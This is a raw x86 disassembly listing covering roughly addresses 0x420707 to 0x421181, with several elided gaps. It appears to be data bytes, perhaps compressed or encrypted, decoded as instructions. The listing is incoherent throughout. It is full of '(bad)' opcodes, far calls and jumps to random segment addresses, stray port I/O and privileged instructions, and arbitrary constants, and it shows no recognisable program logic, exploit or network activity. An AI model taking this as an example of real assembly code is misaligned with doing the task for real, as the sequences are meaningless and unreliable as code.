  420707:	stos   BYTE PTR es:[edi],al
  420708:	add    ebx,DWORD PTR [edi+edi*8-0x543c2bd9]
  42070f:	pop    ds
  420710:	std    
  420711:	dec    ebp
  420712:	aad    0x67
  420714:	xchg   DWORD PTR [ebp-0xbb90ff],esp
  42071a:	sub    cl,dl
  42071c:	out    dx,al
  42071d:	jmp    0x4206a0
  42071f:	outs   dx,BYTE PTR ds:[esi]
  420720:	cwde   
  420721:	iret   
  420722:	pushf  
  420723:	xchg   esp,eax
  420724:	xor    dh,dl
  420726:	(bad)  
  420727:	xor    eax,0xd5c39132
  42072c:	sahf   
  42072d:	test   BYTE PTR [ecx+0x6974c89f],ah
  420733:	scas   al,BYTE PTR es:[edi]
  420734:	and    esp,ebp
  420736:	xchg   edx,eax
  420737:	push   0xef4593cd
  42073c:	inc    edx
  42073d:	scas   al,BYTE PTR es:[edi]
  42073e:	call   0x770d:0x974e4ae3
  420745:	mov    ds:0x36515343,al
  42074a:	xchg   BYTE PTR [eax],ch
  42074c:	mov    esp,0x777e1b07
  420751:	shl    dl,0x5e
  420754:	push   esi
  420755:	mov    ecx,0x12f9b337
  42075a:	inc    edi
  42075b:	push   es
  42075c:	aas    
  42075d:	ds cld 
  42075f:	rol    DWORD PTR [ecx+0x2f3f2444],1
  420765:	test   eax,0x4f2734dd
  42076a:	mov    ch,0x57
  42076c:	xchg   edx,eax
  42076d:	jg     0x42073f
  42076f:	push   es
  420770:	xchg   ecx,eax
  420771:	xor    BYTE PTR [ebx],dh
  420773:	fistp  DWORD PTR cs:[esi+0x70]
  420777:	mov    cl,dh
  420779:	push   0xeebe690e
  42077e:	mov    DWORD PTR gs:[ecx-0x6c],ebp
  420782:	push   esi
  420783:	xchg   edx,eax
  420784:	mov    al,ds:0x351045aa
  420789:	push   edx
  42078a:	push   bx
  42078c:	dec    edi
  42078d:	call   0x0:0xaf47dc
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	(bad)  
  420801:	in     eax,dx
  420802:	dec    ecx
  420803:	mov    dl,0x7a
  420805:	pop    edx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x65000001
  42080d:	pop    ss
  42080e:	jnp    0x42081a
  420810:	dec    esi
  420811:	adc    al,0x2
  420813:	fdivrp st(6),st
  420815:	and    al,0x23
  420817:	xor    eax,0xf535b9bf
  42081c:	add    dl,BYTE PTR [edx+0x2a]
  42081f:	lds    ebp,FWORD PTR [ebx+0x604eb8f3]
  420825:	jmp    0x44ba63c0
  42082a:	(bad)  
  42082b:	dec    edi
  42082c:	lds    eax,FWORD PTR [edx+0x729805ab]
  420832:	add    al,0xc9
  420834:	cmp    al,BYTE PTR [eax-0x74]
  420837:	es rcr bl,1
  42083a:	sub    DWORD PTR [ecx+0x57],ebx
  42083d:	rcl    DWORD PTR [edi],cl
  42083f:	bound  esi,QWORD PTR [ebx+0x5d444cad]
  420845:	xchg   DWORD PTR [edi],ecx
  420847:	loop   0x42086c
  420849:	inc    ecx
  42084a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084b:	fldcw  WORD PTR [edx-0x39155f1a]
  420851:	retf   
  420852:	sub    al,bl
  420854:	ins    BYTE PTR es:[edi],dx
  420855:	mov    ebx,0x7357e271
  42085a:	shl    al,1
  42085c:	popa   
  42085d:	push   ebp
  42085e:	mov    edi,0xaa82b79a
  420863:	pop    ss
  420864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420865:	je     0x420832
  420867:	ror    BYTE PTR ds:0xeef9e649,cl
  42086d:	sbb    DWORD PTR [ecx+0x3ee74610],ecx
  420873:	sub    ah,BYTE PTR [esi-0x4dc55516]
  420879:	pop    es
  42087a:	sub    esi,esi
  42087c:	push   edx
  42087d:	adc    DWORD PTR [edi-0x39],ebp
  420880:	adc    DWORD PTR [edi-0x2abb13b8],0xffffffae
  420887:	mov    eax,0xdb14cdf9
  42088c:	or     bl,BYTE PTR ds:0xd29e5bce
  420892:	mov    al,0x30
  420894:	pop    ds
  420895:	iret   
  420896:	(bad)  
  420897:	fisttp WORD PTR [ecx]
  420899:	ins    DWORD PTR es:[edi],dx
  42089a:	add    DWORD PTR [ecx+eiz*8+0x3d],ecx
  42089e:	les    edi,FWORD PTR [edx]
  4208a0:	and    eax,0x5c937915
  4208a5:	pop    edx
  4208a6:	push   ds
  4208a7:	shl    ebp,1
  4208a9:	mov    ebx,0x91f9e085
  4208ae:	loopne 0x420927
  4208b0:	and    al,0xac
  4208b2:	ret    
  4208b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208b4:	push   0x18017cad
  4208b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208ba:	xor    DWORD PTR [eax-0x69],ebp
  4208bd:	jb     0x4208a8
  4208bf:	iret   
  4208c0:	mov    al,ch
  4208c2:	sub    al,0x2e
  4208c4:	mov    al,0xcc
  4208c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208c7:	pop    ds
  4208c8:	push   eax
  4208c9:	jp     0x4208d8
  4208cb:	sbb    WORD PTR [esi],di
  4208ce:	shr    BYTE PTR [ebx+0x66],cl
  4208d1:	inc    edx
  4208d2:	in     al,dx
  4208d3:	xchg   ebp,eax
  4208d4:	test   eax,0x9a1c48b4
  4208d9:	repnz mov al,ds:0xb33c5af0
  4208df:	xor    BYTE PTR [esi],ah
  4208e1:	jo     0x4208df
  4208e3:	jns    0x42088b
  4208e5:	nop
  4208e6:	sbb    al,0x2
  4208e8:	add    al,0x2d
  4208ea:	sbb    DWORD PTR [ebx+0x54],eax
  4208ed:	test   BYTE PTR es:[eax-0x25d32921],0x63
  4208f5:	outs   dx,DWORD PTR ds:[esi]
  4208f6:	dec    ebx
  4208f7:	dec    ebx
  4208f8:	sbb    dh,cl
  4208fa:	dec    edx
  4208fb:	int    0xf1
  4208fd:	cli    
  4208fe:	mov    dl,0xa0
  420900:	adc    ah,cl
  420902:	push   edx
  420903:	into   
  420904:	cmp    ch,cl
  420906:	jnp    0x420974
  420908:	sahf   
  420909:	dec    ecx
  42090a:	stc    
  42090b:	mov    BYTE PTR [eax-0x55fd54f7],bh
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xf7
  420981:	jmp    0x420961
  420983:	xchg   DWORD PTR [edi+0x5b],edi
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x40000001
  42098d:	xchg   edx,eax
  42098e:	pop    ecx
  42098f:	ret    0x662f
  420992:	lahf   
  420993:	xor    al,BYTE PTR ds:0xe1b865a7
  420999:	inc    ecx
  42099a:	lods   al,BYTE PTR ds:[esi]
  42099b:	cmp    eax,DWORD PTR [ebp+0x155eec75]
  4209a1:	outs   dx,BYTE PTR ds:[esi]
  4209a2:	jmp    0x420957
  4209a4:	in     eax,0x87
  4209a6:	push   gs
  4209a8:	xchg   esp,eax
  4209a9:	shl    BYTE PTR [edx],1
  4209ab:	mov    dl,0x45
  4209ad:	call   0x55480990
  4209b2:	dec    ebp
  4209b3:	add    al,0x7a
  4209b5:	jmp    0x7794:0xe5591e90
  4209bc:	mov    dl,BYTE PTR [ecx-0x24ab71c8]
  4209c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209c3:	or     ebp,esi
  4209c5:	lock and eax,0x4c6d25af
  4209cb:	loopne 0x420a3e
  4209cd:	popa   
  4209ce:	cmp    eax,0x72812ad7
  4209d3:	in     al,dx
  4209d4:	cmp    DWORD PTR [ebx],eax
  4209d6:	jmp    0x2761:0xeb9bb365
  4209dd:	test   eax,0xf846634
  4209e2:	cli    
  4209e3:	push   eax
  4209e4:	mov    cs,WORD PTR [ebx+0x2fcb36ff]
  4209ea:	fimul  DWORD PTR [ecx+0x27]
  4209ed:	call   0x810b:0xfa779f48
  4209f4:	fild   DWORD PTR [ecx-0x79]
  4209f7:	aam    0x5e
  4209f9:	and    edx,ebx
  4209fb:	retf   0xf0f9
  4209fe:	jmp    0xa1f1:0x35d3a178
  420a05:	(bad)  
  420a07:	out    0x9e,eax
  420a09:	mov    edi,0x4541e808
  420a0e:	sbb    bh,BYTE PTR [edx+0x3b]
  420a11:	jbe    0x420a87
  420a13:	in     al,0x13
  420a15:	nop
  420a16:	xchg   DWORD PTR [edi-0x4],ebx
  420a19:	xchg   ebp,eax
  420a1a:	enter  0xf650,0xfa
  420a1e:	dec    eax
  420a1f:	ins    DWORD PTR es:[edi],dx
  420a20:	inc    edi
  420a21:	push   ebx
  420a22:	and    eax,0xa30d7aae
  420a27:	push   ds
  420a28:	outs   dx,BYTE PTR ds:[esi]
  420a29:	xchg   ecx,eax
  420a2a:	daa    
  420a2b:	inc    eax
  420a2c:	sub    ecx,DWORD PTR ds:0x54ed6575
  420a32:	push   0x77
  420a34:	jecxz  0x420a21
  420a36:	pop    es
  420a37:	rcr    bl,0xe5
  420a3a:	xchg   DWORD PTR [ebp+0x77],edx
  420a3d:	mov    ds:0x1e041f0,eax
  420a42:	add    eax,0xb6db28ac
  420a47:	jbe    0x4209cc
  420a49:	mov    DWORD PTR [ecx],ecx
  420a4b:	jae    0x420a81
  420a4d:	dec    edi
  420a4e:	daa    
  420a4f:	add    BYTE PTR [esi+eiz*4],al
  420a52:	push   eax
  420a53:	test   al,0xd2
  420a55:	rcr    DWORD PTR [ebp+0x6e],cl
  420a58:	inc    ebx
  420a59:	add    bl,BYTE PTR [edi]
  420a5b:	ds pop edx
  420a5d:	daa    
  420a5e:	sub    al,0xa4
  420a60:	adc    dh,dl
  420a62:	push   esp
  420a64:	cs or  dh,0x5e
  420a68:	fidivr WORD PTR [ebp-0x262837c7]
  420a6e:	mov    bh,BYTE PTR [ecx]
  420a70:	add    ch,BYTE PTR [ebx+0x91f56ee]
  420a76:	inc    esi
  420a77:	imul   ecx,ebp,0xffffff94
  420a7a:	lahf   
  420a7b:	inc    esp
  420a7c:	in     eax,0x73
  420a7e:	loopne 0x420ad9
  420a80:	mov    dl,0xd1
  420a82:	aad    0x2f
  420a84:	inc    edi
  420a85:	je     0x420a18
  420a87:	lods   al,BYTE PTR ds:[esi]
  420a88:	pop    ebx
  420a89:	pop    esi
  420a8a:	add    eax,0x8c6074b0
  420a8f:	scas   al,BYTE PTR es:[edi]
  420a90:	cmp    al,BYTE PTR [eax]
	...
  420af2:	add    BYTE PTR [eax],al
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	push   es
  420b01:	cmp    bh,bl
  420b03:	fild   WORD PTR [esp+ebx*2+0x1050001]
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	in     eax,0x5d
  420b0e:	js     0x420ac8
  420b10:	out    0x11,al
  420b12:	jl     0x420aa5
  420b14:	retf   
  420b15:	gs mov ebp,0xbd34040
  420b1b:	push   ds
  420b1c:	sub    BYTE PTR [ebp+0x2a8523bc],cl
  420b22:	in     eax,dx
  420b23:	sar    ecx,1
  420b25:	xor    DWORD PTR [edx],edx
  420b27:	xchg   ebx,eax
  420b28:	xor    DWORD PTR [edi+ecx*8-0x7f],esp
  420b2c:	mov    ch,0x22
  420b2e:	jl     0x420b76
  420b30:	xlat   BYTE PTR ds:[ebx]
  420b31:	iret   
  420b32:	aaa    
  420b33:	(bad)  
  420b34:	xchg   esp,eax
  420b35:	or     DWORD PTR [esi],ebx
  420b37:	dec    edi
  420b38:	je     0x420b83
  420b3a:	or     ebx,DWORD PTR [ecx]
  420b3c:	push   es
  420b3d:	and    al,0x5a
  420b3f:	mov    eax,ds:0x1d3aa91b
  420b44:	dec    edi
  420b45:	jmp    0xfe600ab9
  420b4a:	cmp    DWORD PTR [ecx+0x79],esp
  420b4d:	or     eax,0x85478a15
  420b52:	ins    BYTE PTR es:[edi],dx
  420b53:	mov    ecx,0xe21c2b94
  420b58:	pop    ebx
  420b59:	push   ds
  420b5a:	adc    bl,BYTE PTR [ebx-0x2b]
  420b5d:	sar    BYTE PTR [esi+0x62053705],cl
  420b63:	enter  0x1ed1,0x60
  420b67:	lahf   
  420b68:	sbb    DWORD PTR ds:0x8cbd40af,eax
  420b6e:	into   
  420b6f:	in     al,0xea
  420b71:	push   edi
  420b72:	push   es
  420b73:	js     0x420beb
  420b75:	xchg   BYTE PTR [esi],dh
  420b77:	xchg   edx,eax
  420b78:	xchg   esp,eax
  420b79:	xchg   DWORD PTR [ecx],ebp
  420b7b:	push   0xfffffff1
  420b7d:	dec    esi
  420b7e:	fild   QWORD PTR [ebp-0x69]
  420b81:	xchg   edi,eax
  420b82:	nop
  420b83:	ja     0x420b3f
  420b85:	adc    ebp,edi
  420b87:	cli    
  420b88:	fisttp WORD PTR [ebx]
  420b8a:	jne    0x420b75
  420b8c:	es pushf 
  420b8e:	aas    
  420b8f:	or     eax,0x6f5a0df8
  420b94:	lods   al,BYTE PTR ds:[esi]
  420b95:	call   DWORD PTR [ebx+ebp*4-0x17]
  420b99:	push   0x34
  420b9b:	sar    BYTE PTR [eax],0xf1
  420b9e:	rol    DWORD PTR [ecx],0xd4
  420ba1:	mov    ch,BYTE PTR [ebx]
  420ba3:	test   al,0x64
  420ba5:	js     0x420b8c
  420ba7:	ins    BYTE PTR es:[edi],dx
  420ba8:	addr16 je 0x420bc2
  420bab:	out    dx,al
  420bac:	jo     0x420b59
  420bae:	mov    cl,0xe9
  420bb0:	cmp    eax,0x1408f6e
  420bb5:	xor    BYTE PTR [edx],al
  420bb7:	aaa    
  420bb8:	pop    eax
  420bb9:	or     eax,0xdc4c120f
  420bbe:	shr    DWORD PTR [ecx-0x64],0xa0
  420bc2:	sti    
  420bc3:	shl    DWORD PTR [edi],0xb5
  420bc6:	shl    DWORD PTR [eax],1
  420bc8:	and    eax,0xa6cb7bcd
  420bcd:	fnstsw WORD PTR [edx+esi*4-0x472d5644]
  420bd4:	pop    ss
  420bd5:	lahf   
  420bd6:	aaa    
  420bd7:	push   ebp
  420bd8:	por    mm0,QWORD PTR [edx]
  420bdb:	pop    ebp
  420bdc:	rcr    dh,1
  420bde:	ror    ebx,0x7
  420be1:	scas   al,BYTE PTR es:[edi]
  420be2:	loope  0x420bf3
  420be4:	xor    BYTE PTR [ecx],cl
  420be6:	int3   
  420be7:	push   es
  420be8:	xchg   edx,eax
  420be9:	fsub   QWORD PTR ds:0x1bb3f575
  420bef:	lea    ebp,ds:0xd3abc7b4
  420bf5:	xlat   BYTE PTR ds:[ebx]
  420bf6:	loope  0x420bbd
  420bf8:	rcr    eax,cl
  420bfa:	adc    al,0x33
  420bfc:	lock ja 0x420bf7
  420bff:	sbb    edx,ebx
  420c01:	mov    fs,WORD PTR [edx+eiz*4+0x1a]
  420c05:	dec    esi
  420c06:	ss push esi
  420c08:	xor    dh,BYTE PTR [esi]
  420c0a:	mov    esp,0xeffec7ff
  420c0f:	pop    eax
  420c10:	fld    QWORD PTR [eax]
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x2a
  420c81:	mov    ebx,0x5d89e7d2
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x52000001
  420c8d:	mov    ecx,0x9aa88468
  420c92:	(bad)  
  420c93:	cmp    ch,BYTE PTR [ecx-0x4a]
  420c96:	shr    DWORD PTR [ebp-0x206728b0],cl
  420c9c:	and    DWORD PTR [ecx+ecx*4+0x2e132169],esp
  420ca3:	sub    eax,0x727c31fd
  420ca8:	clc    
  420ca9:	cmp    BYTE PTR [ebp+0x15ff0daa],ch
  420caf:	test   DWORD PTR [ebp+0x7ce7ffe7],edi
  420cb5:	icebp  
  420cb6:	sub    DWORD PTR es:[ebx+0x4],ecx
  420cba:	xor    ebx,DWORD PTR [esp+ecx*8+0x10]
  420cbe:	pop    ebx
  420cbf:	sub    dl,BYTE PTR [ebp+edx*4+0x7df00eef]
  420cc6:	and    dl,BYTE PTR [eax+0x57]
  420cc9:	pop    ds
  420cca:	adc    ch,BYTE PTR [ecx]
  420ccc:	push   esp
  420ccd:	push   esi
  420cce:	mov    ds:0xd060f97f,eax
  420cd3:	fbld   TBYTE PTR [eax+ebx*2+0x6df7925e]
  420cda:	inc    edx
  420cdb:	(bad)  
  420cdc:	retf   
  420cdd:	adc    ecx,ebp
  420cdf:	aad    0x2f
  420ce1:	fld    TBYTE PTR [esi+ebx*8+0x4d]
  420ce5:	lods   al,BYTE PTR ds:[esi]
  420ce6:	pusha  
  420ce7:	sbb    edi,esp
  420ce9:	ins    DWORD PTR es:[edi],dx
  420cea:	cmc    
  420ceb:	retf   0xd913
  420cee:	pop    ss
  420cef:	dec    edx
  420cf0:	inc    ecx
  420cf1:	lds    esp,FWORD PTR ds:0x26bb5624
  420cf7:	dec    esi
  420cf8:	add    eax,0xce3aae1e
  420cfd:	imul   edi,DWORD PTR [esi-0x4206c403],0x5b
  420d04:	push   0xad5eee36
  420d09:	retf   0xc963
  420d0c:	imul   ecx,DWORD PTR [esi+0x45],0x3d
  420d10:	or     eax,0xc6379296
  420d15:	cdq    
  420d16:	scas   eax,DWORD PTR es:[edi]
  420d17:	es adc bl,ch
  420d1a:	stos   DWORD PTR es:[edi],eax
  420d1b:	es mov bl,0xd9
  420d1e:	add    si,dx
  420d21:	ins    DWORD PTR es:[edi],dx
  420d22:	mov    edi,0x5eafb655
  420d27:	ret    0x9384
  420d2a:	out    dx,eax
  420d2b:	fild   DWORD PTR [edi-0x31323a7f]
  420d31:	and    ebx,esi
  420d33:	xchg   ecx,eax
  420d34:	sbb    al,BYTE PTR [ebp+0x4d008455]
  420d3a:	xchg   BYTE PTR [eax],dh
  420d3c:	out    dx,eax
  420d3d:	adc    ebp,DWORD PTR [eax+0x116c25ec]
  420d43:	cmc    
  420d44:	arpl   sp,bx
  420d46:	clc    
  420d47:	jle    0x420ceb
  420d49:	repnz adc BYTE PTR [eax+0x63212b0f],bh
  420d50:	mov    al,ds:0xe099a034
  420d55:	jb     0x420db0
  420d57:	xchg   esi,eax
  420d58:	es cwde 
  420d5a:	int3   
  420d5b:	aaa    
  420d5c:	pop    esp
  420d5d:	sbb    DWORD PTR [ecx+edi*2],0x13616ccd
  420d64:	sbb    al,0x49
  420d66:	mov    eax,0xf6224778
  420d6b:	lea    ebp,[ebp-0x3f56b2c0]
  420d71:	mov    WORD PTR [eax+0x76],ds
  420d74:	loopne 0x420d0f
  420d76:	jno    0x420dea
  420d78:	xchg   ebx,eax
  420d79:	lea    esi,[edx+0x23]
  420d7c:	test   esi,esp
  420d7e:	push   esp
  420d7f:	cli    
  420d80:	int    0x44
  420d82:	fsubr  DWORD PTR [eax-0x63]
  420d85:	adc    dl,ah
  420d87:	int    0x8e
  420d89:	ror    ebx,0x41
  420d8c:	or     BYTE PTR ds:0x7880d6,cl
	...
  420df2:	add    BYTE PTR [eax],al
  420df4:	out    0x1e,eax
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x4482f455
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xa1000001,al
  420e0d:	ins    BYTE PTR es:[edi],dx
  420e0e:	gs aaa 
  420e10:	fadd   DWORD PTR [edi]
  420e12:	jle    0x420e47
  420e14:	pop    ss
  420e15:	sahf   
  420e16:	fdivr  DWORD PTR [ecx]
  420e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e19:	mov    WORD PTR [esi-0x2ec20c5d],cs
  420e1f:	daa    
  420e20:	cli    
  420e21:	cmp    BYTE PTR [edx+0x397c446b],dh
  420e27:	push   ebx
  420e28:	add    DWORD PTR [ebx+ebp*4+0x235e3bdc],ebp
  420e2f:	int    0x3c
  420e31:	and    BYTE PTR [edx-0x2527b954],0x74
  420e38:	sub    ah,dh
  420e3a:	mov    edi,0x58193b41
  420e3f:	mov    ebp,0x6c820e38
  420e44:	or     al,0xa5
  420e46:	ins    DWORD PTR es:[edi],dx
  420e47:	xlat   BYTE PTR ds:[ebx]
  420e48:	inc    eax
  420e49:	std    
  420e4a:	mov    ebx,es
  420e4c:	sub    DWORD PTR [esi+0x4154298e],ebp
  420e52:	and    cl,BYTE PTR [ecx-0x60]
  420e55:	aam    0x9c
  420e57:	push   0x6099ecd8
  420e5c:	mov    bl,0x32
  420e5e:	dec    eax
  420e5f:	call   0x6bcc2d35
  420e64:	cmp    esi,DWORD PTR [ecx-0x22425b08]
  420e6a:	in     al,0x2b
  420e6c:	adc    DWORD PTR ds:0x97b9fe00,ecx
  420e72:	fdivr  QWORD PTR [ebx+0x4d]
  420e75:	(bad)  [ecx]
  420e77:	and    BYTE PTR [edi],bl
  420e79:	out    0xc1,eax
  420e7b:	push   ebx
  420e7c:	and    eax,0xd3dcb5c1
  420e81:	mov    esp,0xcee75a62
  420e86:	adc    BYTE PTR [esp+ebx*1-0x212efe71],dh
  420e8d:	jg     0x420e35
  420e8f:	or     eax,0xc6733c2c
  420e94:	add    ebx,DWORD PTR ds:0x42b1930a
  420e9a:	jp     0x420e8a
  420e9c:	enter  0x8dc2,0x7d
  420ea0:	mov    ebp,0x89549492
  420ea5:	xor    DWORD PTR [edx+0x4adeb468],edi
  420eab:	and    dh,BYTE PTR [edi+eax*2-0x3b]
  420eaf:	xchg   BYTE PTR [edi-0x113979a8],ah
  420eb5:	adc    DWORD PTR [edx],ebp
  420eb7:	mov    ds:0xcee5937f,eax
  420ebc:	cmc    
  420ebd:	push   edx
  420ebe:	push   ebx
  420ebf:	or     BYTE PTR [ecx+esi*1],ch
  420ec2:	and    ebp,DWORD PTR [esi]
  420ec4:	pusha  
  420ec5:	inc    ecx
  420ec6:	popf   
  420ec7:	ret    
  420ec8:	mov    WORD PTR [ecx+0x20],?
  420ecb:	mov    eax,ds:0x93dee85e
  420ed0:	aas    
  420ed1:	arpl   WORD PTR ds:0x3f379fb4,cx
  420ed7:	test   al,0x6f
  420ed9:	push   ebp
  420eda:	xchg   edi,eax
  420edb:	ret    0x3101
  420ede:	pop    ds
  420edf:	add    BYTE PTR [esp+ebp*2],dl
  420ee2:	adc    al,0x82
  420ee4:	fmul   QWORD PTR [ebx+ecx*2-0x14]
  420ee8:	jge    0x420f10
  420eea:	mov    bh,0xaa
  420eec:	jl     0x420ef8
  420eee:	add    ecx,esi
  420ef0:	outs   dx,BYTE PTR ds:[esi]
  420ef1:	aad    0x32
  420ef3:	pop    ebx
  420ef4:	fdivr  QWORD PTR [ebx-0x4b65f980]
  420efa:	jecxz  0x420ec4
  420efc:	sbb    bh,BYTE PTR [edi+0x16859329]
  420f02:	stc    
  420f03:	js     0x420ebd
  420f05:	daa    
  420f06:	das    
  420f07:	fidiv  DWORD PTR [edi+eiz*8]
  420f0a:	retf   0xa33a
  420f0d:	sbb    al,0x87
  420f0f:	dec    ecx
  420f10:	imul   eax,DWORD PTR [eax],0x0
	...
  420f72:	add    BYTE PTR [eax],al
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x1fd3ccb7]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0xd5000001
  420f8d:	div    ch
  420f8f:	fucomp st(0)
  420f91:	inc    eax
  420f92:	push   esi
  420f93:	and    DWORD PTR [eax-0x3e],0xf361f278
  420f9a:	pushf  
  420f9b:	mov    esp,0xf02ecfad
  420fa0:	pop    esi
  420fa1:	ror    dl,cl
  420fa3:	lahf   
  420fa4:	and    edx,DWORD PTR [eax-0x7839ad8e]
  420faa:	mov    dl,0x65
  420fac:	call   0xdbd5:0xb877e798
  420fb3:	cmp    cl,cl
  420fb5:	imul   edx,DWORD PTR [ecx-0x11b5e4df],0x23
  420fbc:	dec    esp
  420fbd:	mov    eax,ds:0xd0afab2f
  420fc2:	stos   DWORD PTR es:[edi],eax
  420fc3:	imul   DWORD PTR [ecx-0x67600a49]
  420fc9:	pop    ebp
  420fca:	ss xor eax,0x83814fd7
  420fd0:	mov    esp,DWORD PTR [edi-0x2c3b64ff]
  420fd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd7:	cmp    al,0xc6
  420fd9:	stos   BYTE PTR es:[edi],al
  420fda:	adc    BYTE PTR [edx-0x23],ah
  420fdd:	add    DWORD PTR [ebx-0x75],0x5d9f8bbc
  420fe4:	into   
  420fe5:	sti    
  420fe6:	sub    BYTE PTR [ebp+0x528a4e9d],cl
  420fec:	pop    esp
  420fed:	adc    eax,0x45710b9b
  420ff2:	cmp    bh,al
  420ff4:	pop    ds
  420ff5:	inc    edx
  420ff6:	cmp    DWORD PTR [ebp+0x2c],0x28
  420ffa:	lea    ebx,[ebx+0x4992416e]
  421000:	ret    0x7f43
  421003:	inc    eax
  421004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421005:	dec    ebp
  421006:	jecxz  0x420fd0
  421008:	pop    ecx
  421009:	push   ss
  42100a:	adc    edi,eax
  42100c:	(bad)  
  42100d:	pusha  
  42100e:	in     eax,dx
  42100f:	and    eax,0x96766da8
  421014:	or     DWORD PTR [esi-0x64],edx
  421017:	sub    al,0x5
  421019:	pop    es
  42101a:	ja     0x420fbf
  42101c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42101d:	pusha  
  42101e:	stos   BYTE PTR es:[edi],al
  42101f:	push   cs
  421020:	cli    
  421021:	mov    esp,0x30f6e2d0
  421026:	inc    ebp
  421027:	scas   eax,DWORD PTR es:[edi]
  421028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421029:	sbb    eax,0x8095f7dd
  42102e:	or     ebx,0x2f
  421031:	inc    ebx
  421032:	into   
  421033:	dec    esi
  421034:	push   ecx
  421035:	sbb    BYTE PTR [edi],al
  421037:	retf   0x98f
  42103a:	outs   dx,BYTE PTR ds:[esi]
  42103b:	ret    0x573
  42103e:	mov    al,0x9c
  421040:	sub    dh,ch
  421042:	mov    edi,0xf245698d
  421047:	push   cs
  421048:	jmp    0x647a:0x29f47fd4
  42104f:	daa    
  421050:	cmp    al,0x9c
  421052:	mov    esi,0xc699d857
  421057:	popa   
  421058:	inc    ebx
  421059:	sbb    ah,BYTE PTR [esi-0x46865ad4]
  42105f:	das    
  421060:	popf   
  421061:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421062:	jle    0x420fe7
  421064:	fimul  WORD PTR [ecx-0x68]
  421067:	into   
  421068:	mov    dl,0xeb
  42106a:	mov    esp,0xa0fc8df6
  42106f:	imul   esi,DWORD PTR [edi-0x1c6fe86b],0xbcb51b5d
  421079:	mov    ecx,ebx
  42107b:	mov    al,ds:0x94d66746
  421080:	or     DWORD PTR [eax-0x2a],esp
  421083:	sbb    BYTE PTR [edx-0x3f],ah
  421086:	test   BYTE PTR fs:[ebp-0x3fd16854],bl
  42108d:	push   edi
  42108e:	pop    ebp
  42108f:	hlt    
  421090:	xchg   esi,eax
	...
  4210f1:	add    BYTE PTR [eax],al
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ds,WORD PTR [esi]
  421101:	jmp    0x60da2a62
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x8a000001
  42110d:	or     eax,0x8896d413
  421112:	mov    esp,0xef6005c6
  421117:	adc    dl,ah
  421119:	sbb    BYTE PTR [esi-0x58],dh
  42111c:	out    0x7b,eax
  42111e:	mov    esi,0xca51cf9f
  421123:	aad    0x24
  421125:	lods   eax,DWORD PTR ds:[esi]
  421126:	stc    
  421127:	icebp  
  421128:	out    dx,al
  421129:	jno    0x4210de
  42112b:	loop   0x4210d8
  42112d:	xchg   edx,eax
  42112e:	cli    
  42112f:	sbb    eax,0x5cbf03
  421134:	and    ah,BYTE PTR ds:0xb3ffc1fb
  42113a:	and    DWORD PTR [ebp-0x15],esi
  42113d:	xchg   edi,eax
  42113e:	add    ebp,DWORD PTR [ecx]
  421140:	jmp    0x8752:0x4af1a4be
  421147:	pop    eax
  421148:	popf   
  421149:	out    0x3c,al
  42114b:	pusha  
  42114c:	cmp    BYTE PTR [eax*1+0xdd913d1],bh
  421153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421154:	dec    ebp
  421155:	aas    
  421156:	push   esi
  421157:	xor    eax,0xa1964307
  42115c:	loope  0x42117e
  42115e:	xor    esp,DWORD PTR [esi+0x3f]
  421161:	mov    ecx,0xd0d4a359
  421166:	inc    ebp
  421167:	js     0x4211ae
  421169:	pop    ebp
  42116a:	mov    bl,0x9b
  42116c:	xchg   ecx,eax
  42116d:	mov    al,0x69
  42116f:	mov    ds:0x62465fc,ax
  421175:	mov    ch,0x78
  421177:	dec    ecx
  421178:	fldenv [edi-0x31e9088]
  42117e:	(bad)
  421181:	sbb    al,0x17
